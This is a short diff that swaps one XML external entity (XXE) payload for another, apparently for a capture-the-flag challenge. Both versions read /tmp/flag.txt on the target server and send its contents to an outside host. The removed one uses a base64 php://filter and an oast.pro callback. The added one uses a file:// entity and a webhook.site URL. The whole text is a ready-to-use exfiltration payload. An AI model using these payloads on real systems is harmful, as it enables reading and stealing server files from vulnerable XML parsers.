@@ -1,4 +1,6 @@
-<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/tmp/flag.txt">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://d6iiomqsbufkkah58m70xka1bh1ed8k3u.oast.pro/?x=%file;'>">
-%eval;
-%exfil;
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///tmp/flag.txt">
+<!ENTITY send SYSTEM "https://webhook.site/2507d2c5-cba0-4532-93d1-9ea112ee0155?lol=&xxe;">
+]>
+<name>&send;</name>
